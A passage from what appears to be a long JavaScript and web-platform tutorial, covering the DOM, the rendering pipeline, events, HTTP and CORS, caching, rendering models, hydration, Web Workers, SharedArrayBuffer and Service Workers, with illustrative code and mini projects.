approximates a DOM but implements neither a real layout engine nor a real JS
engine) cannot catch layout- or engine-specific bugs by construction.

## 20. The DOM and BOM: `window`, `document`, node trees, the CSSOM

The **BOM** (Browser Object Model) is everything about the browser window
itself: `window`, `navigator`, `location`, `history`, `screen`. The **DOM**
(Document Object Model) is the tree representation of the page's markup that
JS can read and mutate — `document` is its root.

```javascript
document.documentElement;          // <html>
document.body;                     // <body>
document.querySelector(".card");   // first matching element
document.querySelectorAll("li");   // NodeList of all matches (static snapshot, not live)

const el = document.createElement("div");
el.className = "card";
el.textContent = "Hello";
document.body.appendChild(el);     // this single call triggers a layout recalculation (§21)
```

The **CSSOM** (CSS Object Model) is the analogous tree for parsed stylesheets
— every rule, selector, and computed property, accessible via
`getComputedStyle(el)`. The browser cannot build the final render tree (§21)
until *both* the DOM and CSSOM are ready, which is why a `<link rel=
"stylesheet">` in `<head>` without `async`/`defer` blocks first paint: the
browser deliberately waits rather than flashing unstyled content.

## 21. The critical rendering path: bytes → DOM → CSSOM → render tree → layout → paint → composite

This is the pipeline every byte of HTML/CSS/JS travels through before a
single pixel reaches your screen — the single most important mental model
for web performance work.

```
1. PARSE HTML  →  DOM tree
   The HTML parser is incremental and CAN be blocked by synchronous <script>
   tags encountered mid-document (the parser must run and finish the script
   before it can safely continue, since document.write() could change what
   comes next).

2. PARSE CSS   →  CSSOM tree
   CSS parsing is render-blocking by design: no partial styles are ever
   shown, because a rule later in the file can override one seen earlier
   (correctness requires the whole stylesheet before computing final styles).

3. DOM + CSSOM  →  RENDER TREE
   Only visible nodes with computed styles (display:none nodes are excluded
   entirely; visibility:hidden nodes ARE included, just invisible — this
   distinction is why display:none saves layout cost and visibility:hidden
   doesn't).

4. RENDER TREE  →  LAYOUT (a.k.a. "reflow")
   Computes the exact position and size of every render-tree node. Expensive:
   changing one node's width can cascade and force recomputing its entire
   subtree AND everything after it in document flow.

5. LAYOUT  →  PAINT
   Rasterizes: fills in pixels — text, colors, borders, shadows, images —
   for each render-tree node, typically onto separate "layers".

6. PAINT  →  COMPOSITE
   The GPU combines the painted layers into the final frame you see,
   applying transforms and opacity cheaply without re-painting (§22).
```

**Why this pipeline matters for every performance decision you make**: which
CSS properties you animate determines *how far back up this pipeline* the
browser must re-run on every frame.

```
Changing `width`, `top`, `left`, `font-size`      -> triggers LAYOUT (step 4) + PAINT + COMPOSITE
Changing `background-color`, `box-shadow`, `color` -> triggers PAINT (step 5) + COMPOSITE, skips layout
Changing `transform`, `opacity`                     -> triggers ONLY COMPOSITE (step 6)
                                                        -> can run entirely on the GPU thread,
                                                           no main-thread JS involved on every frame
```

This is *the* reason every serious animation guideline says "animate
`transform`/`opacity`, never `top`/`left`/`width`" — it's not a style
preference, it's the difference between a 60fps animation running off the
main thread and one that re-runs full layout on every single frame.

```javascript
// BAD: forces synchronous layout on every animation frame ("layout thrashing")
function animateBad(el, targetLeft) {
  function step() {
    const current = parseFloat(getComputedStyle(el).left); // READ triggers layout
    el.style.left = (current + 1) + "px";                   // WRITE invalidates layout
    if (current < targetLeft) requestAnimationFrame(step);
  }
  step();
}

// GOOD: composite-only, runs on the GPU, never touches layout
function animateGood(el, targetX) {
  el.style.transform = `translateX(${targetX}px)`;
  el.style.transition = "transform 300ms ease-out";
}
```

## 22. Compositing and the GPU: layers, rasterization, the 16.6ms frame budget, jank

At 60Hz, the browser has **16.6ms** to go from "something changed" to "a new
frame is on screen" — miss that budget and a frame is dropped, which the
human eye perceives as **jank** (stutter). The budget is shared:

```
16.6ms frame budget, roughly:
  JavaScript (event handlers, your animation logic)   |
  Style recalculation (CSSOM re-match)                 |  all on the MAIN thread
  Layout (if triggered)                                |
  Paint (if triggered)                                 |
  Composite                                             — can run on a SEPARATE compositor
                                                            thread, independent of main-thread JS
```

Elements get **promoted to their own compositor layer** (visible in DevTools
via the "Layers" panel) when they have a `transform`/`opacity` animation,
`will-change`, `<video>`, or a few other triggers — once promoted, the GPU
can move/fade that layer independently, without asking the main thread to
redo any work, which is exactly why compositor-only animations stay smooth
even while the main thread is busy running your JS.

```css
/* Hint the browser to promote this element to its own layer BEFORE the
   animation starts, avoiding an expensive layer-promotion mid-animation. */
.will-animate {
  will-change: transform;
}
```

Overusing `will-change` is a real anti-pattern: every promoted layer costs
GPU memory, and a page with hundreds of unnecessary layers can be *slower*
than one with none — apply it narrowly, right before an animation starts,
and remove it after.

## 23. The event model: capturing, bubbling, delegation, passive listeners

DOM events travel through **three phases**: capturing (root → target),
target, then bubbling (target → root) — this two-directional travel is what
lets a listener on an ancestor react to events from descendants it doesn't
even know exist yet.

```javascript
// listener fires during the BUBBLING phase by default (3rd arg false/omitted)
document.body.addEventListener("click", (e) => console.log("bubble: body"));
// listener fires during the CAPTURING phase (3rd arg true)
document.body.addEventListener("click", (e) => console.log("capture: body"), true);

// clicking a deeply nested button logs:
// "capture: body"  (travels down first)
// ... then any listeners on the target itself ...
// "bubble: body"    (travels back up)
```

**Event delegation** exploits bubbling to attach ONE listener to a container
instead of one per child — critical for lists with thousands of items or
items added dynamically after the listener was set up:

```javascript
// One listener handles clicks on ANY current or future <li>, no per-item binding needed
document.querySelector("ul").addEventListener("click", (e) => {
  const li = e.target.closest("li");
  if (li) console.log("clicked:", li.textContent);
});
```

**Passive listeners** tell the browser "this listener will never call
`preventDefault()`", letting the browser start scrolling immediately instead
of waiting to see if your `touchstart`/`wheel` handler cancels it — a
measurable, real scroll-jank fix on mobile:

```javascript
el.addEventListener("touchstart", handleTouch, { passive: true });
```

## 24. Mini project: finding and fixing jank with the Performance panel

A step-by-step diagnostic workflow (Chrome DevTools, but Firefox's Performance
panel is functionally equivalent):

1. Open DevTools → **Performance** tab → click **Record** → interact with the
   janky part of the page → **Stop**.
2. Look at the **frame chart**: red triangles mark dropped frames.
3. Click a slow frame and read the **bottom-up/call tree**: is time going to
   "Scripting" (your JS), "Rendering" (layout/style), or "Painting"?
4. If "Rendering" dominates and shows repeated "Layout" entries inside a
   single frame — that's **layout thrashing** (§21's bad example):
   alternating reads (`getComputedStyle`, `.offsetHeight`) and writes
   (`.style.x = ...`) in a loop, each read forcing the browser to flush
   pending layout work synchronously to answer accurately.
5. Fix: batch all reads first, then all writes:

```javascript
// BAD: read, write, read, write — forces N synchronous layouts for N elements
elements.forEach(el => {
  const h = el.offsetHeight;      // READ (forces layout flush if dirty)
  el.style.height = h * 2 + "px"; // WRITE (invalidates layout)
});

// GOOD: all reads, then all writes — ONE layout flush total
const heights = elements.map(el => el.offsetHeight);   // all READs
elements.forEach((el, i) => { el.style.height = heights[i] * 2 + "px"; }); // all WRITEs
```

---

# Part IV — HTTP, networking, and the browser

## 25. HTTP fundamentals for JS developers

Every `fetch()` call is an HTTP request under the hood: a method, a URL, a
set of headers, and an optional body — the response mirrors that shape with
a status code, headers, and a body.

```javascript
const res = await fetch("https://api.example.com/users/42", {
  method: "GET",
  headers: { "Accept": "application/json" },
});
res.status;        // 200
res.ok;             // true for 200-299
res.headers.get("content-type");
const data = await res.json();
```

Status code classes you'll branch on constantly: `2xx` success, `3xx`
redirect (handled transparently by `fetch` unless `redirect: "manual"`),
`4xx` client error (your request was wrong — don't blindly retry), `5xx`
server error (often safe to retry with backoff, §31).

For the full HTTP/TCP/TLS mechanics underneath this — handshakes, headers,
keep-alive — see [`wiki/networking/tcp-ip/real-life-example.md`](../networking/tcp-ip/real-life-example.html);
this section stays focused on what's specifically relevant from JS.

## 26. HTTP/1.1 vs HTTP/2 vs HTTP/3 in the browser

The protocol version genuinely changes how you should write browser code:

| | Connections per origin | Multiplexing | Practical JS implication |
|---|---|---|---|
| HTTP/1.1 | ~6 (browser-enforced cap) | None — one request per connection at a time | Firing >6 concurrent `fetch()` calls to the same origin queues the rest; domain sharding (splitting assets across subdomains) was a real HTTP/1.1-era workaround |
| HTTP/2 | 1 (all requests multiplexed over it) | Yes, many parallel streams per connection | Domain sharding actively **hurts** HTTP/2 (extra handshakes for no benefit) — bundle to fewer origins, not more |
| HTTP/3 (QUIC/UDP) | 1, but streams don't head-of-line-block each other at the transport level | Yes, independent streams | Best on lossy mobile networks — one dropped packet no longer stalls unrelated in-flight requests, unlike HTTP/2 over TCP |

Resource hints in your HTML directly influence connection setup timing:

```html
<link rel="preconnect" href="https://api.example.com">
<!-- Opens the TCP+TLS connection to api.example.com immediately, before any
     fetch() call needs it — saves a full round trip on the first real request. -->

<link rel="dns-prefetch" href="https://cdn.example.com">
<!-- Cheaper than preconnect: resolves DNS only, for origins you'll need
     later but not immediately. -->

<link rel="preload" href="/fonts/main.woff2" as="font" crossorigin>
<!-- Tells the browser "fetch this now, I know I'll need it soon" — for
     resources the parser wouldn't otherwise discover until late (fonts
     referenced only inside CSS, for instance). -->
```

## 27. `fetch` and `XMLHttpRequest`: requests, streaming, aborting

`fetch()` is promise-based and the modern default; `XMLHttpRequest` (XHR)
predates promises and is still relevant for **upload progress events**,
which `fetch` didn't support natively until `ReadableStream` request bodies
matured.

```javascript
// Aborting an in-flight fetch — critical for search-as-you-type, tab switches, etc.
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);   // 5s timeout

try {
  const res = await fetch("/api/search?q=js", { signal: controller.signal });
  clearTimeout(timeoutId);
  const data = await res.json();
} catch (err) {
  if (err.name === "AbortError") console.log("Request timed out or was cancelled");
  else throw err;
}
```

**Streaming a response body** — process data as it arrives instead of
waiting for the whole payload (large JSON, NDJSON logs, LLM token streams):

```javascript
const res = await fetch("/api/stream");
const reader = res.body.getReader();
const decoder = new TextDecoder();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  console.log("chunk:", decoder.decode(value, { stream: true }));
}
```

## 28. CORS in depth: same-origin policy, preflight, credentials

The **same-origin policy** is the browser's foundational security boundary:
scripts from `https://a.example.com` cannot read responses from
`https://b.example.com` unless `b.example.com` explicitly opts in via CORS
headers. "Origin" is the exact triple `(scheme, host, port)` — `http://` vs
`https://`, or a different port, is a *different* origin even on the same
domain.

```javascript
// From https://app.example.com, this request goes out on the wire regardless —
// CORS does NOT stop the request from being SENT. It stops the BROWSER from
// letting your JS READ the response, unless the server says it's allowed to.
fetch("https://api.other.com/data");
```

The server must respond with `Access-Control-Allow-Origin: https://app.example.com`
(or `*` for fully public APIs) or the browser blocks JS from reading the
response — the response bytes did arrive over the network; CORS is enforced
by the *browser*, not the server or the network, which is why CORS errors
are invisible to tools like `curl`.

A **preflight request** (`OPTIONS`) is sent automatically by the browser
*before* certain requests — non-"simple" methods (`PUT`, `DELETE`, `PATCH`),
or custom headers like `Authorization` — to ask the server's permission
before sending the real request with credentials or a non-trivial body:

```
Browser preflight (automatic, you never write this):
  OPTIONS /api/users/42
  Access-Control-Request-Method: DELETE
  Access-Control-Request-Headers: authorization

Server must respond:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: DELETE
  Access-Control-Allow-Headers: authorization

Only THEN does the browser send the actual DELETE request.
```

Sending cookies cross-origin requires **both** sides to opt in explicitly —
a common source of "my auth cookie isn't being sent" bugs:

```javascript
fetch("https://api.example.com/me", { credentials: "include" });
// AND the server must respond with:
//   Access-Control-Allow-Credentials: true
//   Access-Control-Allow-Origin: https://app.example.com   (NOT "*" — wildcard is
//                                                             forbidden together with credentials)
```

## 29. HTTP caching and the browser cache

`Cache-Control` response headers tell the browser (and any intermediate CDN)
how long a response is reusable without asking the server again:

```
Cache-Control: max-age=31536000, immutable   // cache for a year, never revalidate
                                              // (use for hashed filenames: app.a3f21c.js)
Cache-Control: no-cache                       // always revalidate with the server (via ETag)
                                              // before using the cached copy — NOT "don't cache"
Cache-Control: no-store                       // never cache at all — for sensitive responses
```

**ETags** enable cheap revalidation without re-downloading unchanged
content: the server sends an `ETag` (a content fingerprint); on the next
request the browser sends `If-None-Match: <etag>`; if unchanged, the server
replies `304 Not Modified` with no body, saving the full download.

```javascript
// The browser handles this negotiation transparently for you inside fetch() —
// you'll just see it as a 304 in the Network panel with near-zero transfer size.
fetch("/api/data");  // second call with an unchanged resource: 304, body served from disk cache
```

Beyond the HTTP cache, the **Cache API** (used by service workers, §40) gives
JS explicit, programmatic control over a separate cache storage — the
foundation of offline-capable apps.

## 30. WebSockets and Server-Sent Events

`fetch`/XHR are request-response; two APIs exist specifically for servers
pushing data without the client asking again:

```javascript
// WebSocket: full-duplex, both sides can send anytime, binary or text
const ws = new WebSocket("wss://example.com/chat");
ws.onopen = () => ws.send(JSON.stringify({ type: "join", room: "general" }));
ws.onmessage = (event) => console.log("received:", event.data);
ws.onclose = (event) => console.log("closed:", event.code, event.reason);

// Server-Sent Events (SSE): one-directional, server -> client only, plain text,
// auto-reconnects on drop, and rides over ordinary HTTP (no protocol upgrade)
const sse = new EventSource("/api/live-updates");
sse.onmessage = (event) => console.log("update:", event.data);
sse.addEventListener("price-change", (event) => console.log("price:", event.data));
```

Choose WebSockets when the client needs to send data too (chat, multiplayer,
collaborative editing); choose SSE for simpler server-push-only cases (live
scores, notifications) — SSE's built-in reconnection and plain-HTTP
transport make it noticeably less operational overhead when bidirectionality
isn't needed.

## 31. Mini project: a resilient fetch client (timeout, retry, cache, dedup)

```javascript
class ResilientClient {
  #cache = new Map();
  #inFlight = new Map();   // dedupe: identical concurrent requests share one promise

  async get(url, { timeoutMs = 5000, retries = 2, cacheMs = 30000 } = {}) {
    const cached = this.#cache.get(url);
    if (cached && Date.now() - cached.time < cacheMs) return cached.data;

    if (this.#inFlight.has(url)) return this.#inFlight.get(url);   // join the existing request

    const promise = this.#fetchWithRetry(url, timeoutMs, retries)
      .then((data) => {
        this.#cache.set(url, { data, time: Date.now() });
        this.#inFlight.delete(url);
        return data;
      })
      .catch((err) => { this.#inFlight.delete(url); throw err; });

    this.#inFlight.set(url, promise);
    return promise;
  }

  async #fetchWithRetry(url, timeoutMs, retries) {
    for (let attempt = 0; attempt <= retries; attempt++) {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      try {
        const res = await fetch(url, { signal: controller.signal });
        clearTimeout(timer);
        if (!res.ok && res.status >= 500 && attempt < retries) {
          await new Promise(r => setTimeout(r, 2 ** attempt * 200));  // exponential backoff
          continue;
        }
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json();
      } catch (err) {
        clearTimeout(timer);
        if (attempt === retries) throw err;
      }
    }
  }
}
```

This single class demonstrates request deduplication (multiple UI components
asking for the same data at once share one network call), TTL caching,
per-request timeouts via `AbortController`, and retry-with-backoff limited to
retriable (5xx) failures — the exact pattern behind libraries like SWR and
React Query, minus the React-specific rendering integration.

---

# Part V — Rendering web applications in depth

## 32. Rendering models: CSR, SSR, SSG, ISR

| Model | HTML generated | First paint | SEO/no-JS | Server load |
|---|---|---|---|---|
| **CSR** (Client-Side Rendering) | In the browser, by JS, after download | Slow (blank until JS runs + fetches data) | Poor without extra work | Low (static file hosting) |
| **SSR** (Server-Side Rendering) | On the server, per-request | Fast (real HTML immediately) | Good | High (a server render per request) |
| **SSG** (Static Site Generation) | At build time, once | Fastest (pure static file) | Good | Lowest (CDN-served) |
| **ISR** (Incremental Static Regeneration) | At build time, then regenerated on a schedule/on-demand | Fast, can go slightly stale | Good | Low, with periodic regen cost |

A CSR page's actual load sequence explains why it "feels" slower even on a
fast connection:

```
CSR:  HTML shell (empty <div id="root">) -> download JS bundle -> execute JS
      -> JS fetches data -> JS renders DOM -> user sees content
      (4 sequential round-trip-dependent steps before anything visible)

SSR:  Server fetches data -> server renders full HTML -> browser paints
      immediately -> JS bundle arrives later and "hydrates" (§34) for
      interactivity (1 round trip before visible content)
```

Real frameworks let you mix these per-route: Next.js/Nuxt/SvelteKit can SSR
a dashboard, SSG a marketing page, and ISR a blog — the "rendering model" is
a per-page decision, not an app-wide one.

## 33. Virtual DOM reconciliation vs fine-grained reactivity (signals)

Two competing strategies for "when data changes, update the DOM efficiently":

**Virtual DOM (React, Vue 2, Preact)**: on every state change, re-run the
component function to produce a new lightweight JS-object tree, **diff** it
against the previous tree, and apply only the minimal set of real DOM
mutations found by the diff.

```javascript
// Simplified idea of what a VDOM diff does conceptually
function diff(oldVNode, newVNode) {
  if (oldVNode.type !== newVNode.type) return replace(oldVNode, newVNode);
  const patches = diffProps(oldVNode.props, newVNode.props);
  const childPatches = diffChildren(oldVNode.children, newVNode.children);
  return { patches, childPatches };   // apply only these to the REAL DOM
}
```

Cost: re-running the whole component function and diffing is wasted work
proportional to component size, even for a one-character text change — this
is why `React.memo`/`useMemo`/`shouldComponentUpdate` exist, as manual
escape hatches from re-running work the framework can't otherwise know is
unnecessary.

**Fine-grained reactivity (Signals — Solid, Vue 3's reactivity core,
Svelte 5, Angular Signals)**: instead of diffing trees, the framework tracks
*exactly* which DOM nodes depend on which piece of state at setup time, so a
state change updates **only that specific text node or attribute** directly
— no diffing, no re-running unrelated code.

```javascript
// Solid-style signal: reading count() inside the JSX registers a fine-grained
// dependency; updating it patches ONLY the text node that read it — nothing
// else in the component ever re-runs.
const [count, setCount] = createSignal(0);
return <button onClick={() => setCount(count() + 1)}>Count: {count()}</button>;
```

Neither is universally "faster" in every case, but signals eliminate an
entire category of "why is this unrelated component re-rendering" bugs and
manual-memoization boilerplate by construction — it's the direction most new
frameworks (and React's own compiler work) have moved toward since ~2023.

## 34. Hydration and partial/progressive/resumable hydration

**Hydration** is the process of taking server-rendered static HTML and
"waking it up" — attaching event listeners and internal framework state so
it becomes interactive, without re-creating the DOM from scratch.

```
1. Server sends fully-formed HTML  -> browser paints it immediately (fast!)
2. Browser downloads the JS bundle  -> framework re-runs the same render
   logic client-side, comparing what IT would produce against the EXISTING
   server-rendered DOM
3. Framework attaches event listeners to the existing nodes instead of
   replacing them  -> page is now interactive
```

The classic cost: step 2/3 requires downloading and executing the **entire**
JS bundle before *any* part of the page is interactive, even if the user
only wants to click one button — full hydration doesn't scale well to large
pages on slow devices/networks.

**Partial hydration / islands architecture** (Astro, Qwik's resumability,
React Server Components) fixes this by only hydrating specific interactive
"islands" (a like button, a comment form) while the rest of the page (an
article body) stays pure static HTML that's never re-processed by JS at all.

**Resumability** (Qwik specifically) goes further: instead of *re-running*
render logic to reconstruct state (traditional hydration), it serializes the
already-computed state and event-listener wiring into the HTML itself, so
the client can "resume" exactly where the server left off without
re-executing any component code up front — event listeners are attached
lazily, only when a user actually interacts with that specific element.

## 35. Core Web Vitals: LCP, INP, CLS — measuring and fixing them

Google's Core Web Vitals are the three metrics that most directly map to
perceived user experience, and are used in Search ranking:

| Metric | Measures | Good threshold | Common fixes |
|---|---|---|---|
| **LCP** (Largest Contentful Paint) | Time until the largest visible element (usually a hero image or heading) renders | ≤ 2.5s | Preload the LCP image, remove render-blocking CSS/JS, use SSR/SSG for above-the-fold content |
| **INP** (Interaction to Next Paint) | Latency from a user interaction (click/tap/keypress) to the next painted frame reflecting it | ≤ 200ms | Break up long JS tasks (§37), avoid heavy synchronous work in event handlers, use `requestIdleCallback` for non-urgent work |
| **CLS** (Cumulative Layout Shift) | Unexpected layout movement after initial render | ≤ 0.1 | Always set explicit `width`/`height` on images/embeds, reserve space for ads/late-loading content, avoid inserting content above existing content |

Measuring them in real user sessions (not just synthetic lab tests) via the
`web-vitals` library:

```javascript
import { onLCP, onINP, onCLS } from "web-vitals";

onLCP((metric) => sendToAnalytics("LCP", metric.value));
onINP((metric) => sendToAnalytics("INP", metric.value));
onCLS((metric) => sendToAnalytics("CLS", metric.value));
```

Diagnosing a long task that hurts INP with the `PerformanceObserver` API
directly (no library needed):

```javascript
new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.duration > 50) {   // "long task" threshold per the spec
      console.warn(`Long task: ${entry.duration.toFixed(1)}ms`, entry);
    }
  }
}).observe({ type: "longtask", buffered: true });
```

## 36. Mini project: a virtual-DOM renderer from scratch (~150 lines)

A minimal illustration of §33's VDOM diffing concept, enough to actually run:

```javascript
// vdom.js — a tiny virtual DOM: h() creates nodes, render() diffs and patches

function h(type, props, ...children) {
  return { type, props: props || {}, children: children.flat() };
}

function createRealNode(vnode) {
  if (typeof vnode === "string" || typeof vnode === "number") {
    return document.createTextNode(String(vnode));
  }
  const el = document.createElement(vnode.type);
  for (const [key, value] of Object.entries(vnode.props)) {
    if (key.startsWith("on")) el.addEventListener(key.slice(2).toLowerCase(), value);
    else el.setAttribute(key, value);
  }
  vnode.children.forEach((child) => el.appendChild(createRealNode(child)));
  vnode.dom = el;
  return el;
}

function diff(oldVNode, newVNode) {
  if (oldVNode === undefined) return { type: "CREATE", newVNode };
  if (newVNode === undefined) return { type: "REMOVE" };
  if (typeof oldVNode !== typeof newVNode ||
      (typeof oldVNode === "object" && oldVNode.type !== newVNode.type)) {
    return { type: "REPLACE", newVNode };
  }
  if (typeof newVNode === "string" || typeof newVNode === "number") {
    return oldVNode !== newVNode ? { type: "TEXT", newVNode } : { type: "NONE" };
  }
  return {
    type: "UPDATE",
    propPatches: diffProps(oldVNode.props, newVNode.props),
    childPatches: diffChildren(oldVNode.children, newVNode.children),
    oldVNode, newVNode,
  };
}

function diffProps(oldProps, newProps) {
  const patches = [];
  for (const key of Object.keys(newProps)) {
    if (oldProps[key] !== newProps[key]) patches.push({ key, value: newProps[key] });
  }
  for (const key of Object.keys(oldProps)) {
    if (!(key in newProps)) patches.push({ key, value: null });   // removed
  }
  return patches;
}

function diffChildren(oldChildren, newChildren) {
  const max = Math.max(oldChildren.length, newChildren.length);
  const patches = [];
  for (let i = 0; i < max; i++) patches.push(diff(oldChildren[i], newChildren[i]));
  return patches;
}

function patch(parentDom, patchObj, index = 0) {
  const existing = parentDom.childNodes[index];
  switch (patchObj.type) {
    case "CREATE":
      parentDom.appendChild(createRealNode(patchObj.newVNode));
      break;
    case "REMOVE":
      if (existing) parentDom.removeChild(existing);
      break;
    case "REPLACE":
      parentDom.replaceChild(createRealNode(patchObj.newVNode), existing);
      break;
    case "TEXT":
      existing.textContent = patchObj.newVNode;
      break;
    case "UPDATE": {
      const dom = patchObj.oldVNode.dom;
      patchObj.oldVNode.newVNode = patchObj.newVNode;
      patchObj.newVNode.dom = dom;
      for (const { key, value } of patchObj.propPatches) {
        if (value === null) dom.removeAttribute(key);
        else dom.setAttribute(key, value);
      }
      patchObj.childPatches.forEach((childPatch, i) => patch(dom, childPatch, i));
      break;
    }
    // "NONE": nothing changed, skip entirely — this is the whole point of diffing
  }
}

// --- usage ---
let currentVNode;
function render(vnode, container) {
  const patchObj = diff(currentVNode, vnode);
  patch(container, currentVNode === undefined ? { type: "CREATE", newVNode: vnode } : patchObj);
  currentVNode = vnode;
}

let count = 0;
function view() {
  return h("div", {},
    h("h1", {}, `Count: ${count}`),
    h("button", { onClick: () => { count++; render(view(), document.getElementById("app")); } },
      "Increment"),
  );
}
render(view(), document.getElementById("app"));
```

Running this and clicking "Increment" repeatedly, then inspecting the DOM in
DevTools, shows the `<h1>`'s text node updates in place on every click while
the `<button>` element itself is never recreated — exactly the "diff, then
patch only what changed" behavior §33 described in the abstract.

---

# Part VI — Advanced JS: concurrency and multi-threaded browser apps

## 37. Why JS is (mostly) single-threaded, and what that really means

The precise claim is: **each JS realm (roughly: each tab, or each worker) has
exactly one thread executing its JS**, not "the browser has one thread total."
A page with 3 Web Workers genuinely has 4 independent JS threads running
concurrently — the main thread and each worker's own thread, each with its
own call stack, its own event loop, and (critically) **no shared memory by
default** — communication only happens via message-passing (§38).

This design was a deliberate trade-off: shared-memory multithreading (as in
C/Java) requires locks, and locks in a UI thread that also handles user
input and rendering are a well-known source of deadlocks and freezes.
JS's single-threaded-per-realm model makes an entire class of concurrency
bugs (data races on shared objects) structurally impossible on the main
thread — at the cost of needing explicit APIs (Workers) to use multiple CPU
cores at all.

```
Main thread realm:  [event loop] -- [call stack] -- DOM access, UI events
Worker 1 realm:     [event loop] -- [call stack] -- NO DOM access, own globals
Worker 2 realm:     [event loop] -- [call stack] -- NO DOM access, own globals
                     ^ each is single-threaded internally; the THREE run in parallel
```

## 38. Web Workers: `postMessage`, structured clone, transferable objects

A **dedicated Worker** runs a separate script on its own OS thread, with its
own global scope (`self`, not `window`) — no DOM access, but full access to
`fetch`, timers, and (crucially) heavy computation that would otherwise
freeze the UI.

```javascript
// main.js
const worker = new Worker("worker.js");
worker.postMessage({ cmd: "compute", n: 40 });
worker.onmessage = (e) => console.log("fibonacci result:", e.data.result);
worker.onerror = (e) => console.error("worker crashed:", e.message);

// worker.js
self.onmessage = (e) => {
  if (e.data.cmd === "compute") {
    const result = fib(e.data.n);          // blocks the WORKER thread, not the main thread
    self.postMessage({ result });
  }
};
function fib(n) { return n <= 1 ? n : fib(n - 1) + fib(n - 2); }
```

Data passed via `postMessage` is **copied**, not shared, using the
**structured clone algorithm** — which handles objects, arrays, `Map`/`Set`,
`Date`, and typed arrays, but NOT functions, DOM nodes, or class instances
with methods/prototypes (only their plain-data shape survives).

```javascript
worker.postMessage({ date: new Date(), items: new Map([["a", 1]]) }); // fine, structured-clonable
worker.postMessage({ fn: () => {} });   // throws DataCloneError — functions aren't clonable
```

**Transferable objects** avoid the copy entirely for large binary data —
ownership of the underlying memory moves to the receiver, and the sender's
reference becomes unusable (zero-copy, not "clone-then-delete"):

```javascript
const buffer = new ArrayBuffer(64 * 1024 * 1024);  // 64MB
worker.postMessage({ buffer }, [buffer]);           // second arg: list of transferables
buffer.byteLength;   // 0 — the sender no longer owns this memory at all
```

## 39. `SharedArrayBuffer` and `Atomics`: real shared-memory concurrency

Unlike a regular `ArrayBuffer` (owned by one realm at a time), a
**`SharedArrayBuffer`** can be given to multiple workers simultaneously,
with all of them reading and writing the *same* underlying memory — this is
genuine shared-memory multithreading, the first time JS ever had it.

```javascript
// main.js
const sab = new SharedArrayBuffer(4);           // 4 bytes = one Int32
const view = new Int32Array(sab);
Atomics.store(view, 0, 0);

worker.postMessage(sab);   // NOT copied, NOT transferred — genuinely SHARED

worker.onmessage = () => console.log("final value:", Atomics.load(view, 0));
worker.postMessage("start");

// worker.js — receives the SAME memory, both threads can race on it
let sharedView;
self.onmessage = (e) => {
  if (e.data instanceof SharedArrayBuffer) { sharedView = new Int32Array(e.data); return; }
  for (let i = 0; i < 1000; i++) Atomics.add(sharedView, 0, 1);  // ATOMIC increment — no lost updates
  self.postMessage("done");
};
```

**`Atomics`** provides the lock-free primitives (`add`, `compareExchange`,
`load`, `store`, `wait`, `notify`) required to touch shared memory safely —
without them, two threads doing `sharedView[0]++` concurrently is a classic
data race (read-modify-write isn't atomic), silently dropping increments.
`Atomics.wait`/`notify` implement real blocking synchronization (a
condition-variable-like primitive) between worker threads — genuinely novel
capability in JS, previously impossible without shared memory.

**The security catch**: `SharedArrayBuffer` was disabled globally across all
major browsers in 2018 in response to Spectre (a shared-memory, high-
resolution timer is exactly the primitive needed for that class of
speculative-execution side-channel attack). It's back today **only** on
pages that opt into **cross-origin isolation**:

```
# Required response headers on the top-level document to re-enable SharedArrayBuffer:
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

Without both headers set, `typeof SharedArrayBuffer === "undefined"` in the
page — this trips up a lot of teams trying to ship WASM-threads-based tools
(FFmpeg.wasm, SQLite-in-a-worker with true concurrency) who forget the
cross-origin-isolation requirement is now mandatory.

## 40. Shared Workers and Service Workers: lifecycle, scope, background sync

| | Instances | Lifetime | Purpose |
|---|---|---|---|
| **Dedicated Worker** (§38) | One per creating tab | Dies with the tab | Offload computation from one page |
| **Shared Worker** | ONE instance shared across all same-origin tabs | Dies when the last connected tab closes | Cross-tab state (a shared cache, a single WebSocket serving multiple tabs) |
| **Service Worker** | ONE per origin, runs independently of any open tab | Survives tab closure; browser can terminate/restart it anytime between events | Network proxy — offline caching, background sync, push notifications |

A **Service Worker** is the most architecturally distinct: it sits as a
programmable network proxy **between your page and the network**, letting
you intercept every `fetch` and decide whether to serve from cache, network,
or a mix — the foundation of every installable, offline-capable Progressive
Web App.

```javascript
// sw.js — registered once via navigator.serviceWorker.register("/sw.js")
const CACHE_NAME = "app-v1";
const PRECACHE_URLS = ["/", "/app.js", "/app.css", "/offline.html"];

self.addEventListener("install", (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then((cache) => cache.addAll(PRECACHE_URLS))
  );
});

self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      if (cached) return cached;                         // cache-first for known assets
      return fetch(event.request).catch(() => caches.match("/offline.html")); // offline fallback
    })
  );
});

self.addEventListener("activate", (event) => {
  // clean up old cache versions on activation
  event.waitUntil(
    caches.keys().then((keys) =>
      Promise.all(keys.filter((k) => k !== CACHE_NAME).map((k) => caches.delete(k)))
    )
  );
});
```

The Service Worker lifecycle (`install` → `waiting` → `activate`) is
deliberately conservative — a new Service Worker version installs
**alongside** the currently active one and only takes over once all tabs
using the old version have closed (unless you explicitly call
`self.skipWaiting()`), preventing a mid-session version mismatch between
your JS and your cached assets.

## 41. Multi-threaded architecture patterns: worker pools, Comlink-style RPC

Raw `postMessage` with manual `cmd`/`result` message shapes (§38) doesn't
scale past a couple of message types — real apps use two patterns:

**Worker pool** — a fixed number of persistent workers pulling tasks from a
shared queue, avoiding the real cost of spinning up a new worker per task
(worker creation involves a full separate JS realm bootstrap, not free):

```javascript
class WorkerPool {
  #workers; #queue = []; #idle = [];
  constructor(scriptUrl, size = navigator.hardwareConcurrency || 4) {
    this.#workers = Array.from({ length: size }, () => {
      const w = new Worker(scriptUrl);
      w.onmessage = (e) => this.#handleResult(w, e.data);
      return w;
    });
    this.#idle = [...this.#workers];
  }
  run(task) {
    return new Promise((resolve) => {
      this.#queue.push({ task, resolve });
      this.#dispatch();
    });
  }
  #dispatch() {
    while (this.#idle.length && this.#queue.length) {
      const worker = this.#idle.pop();
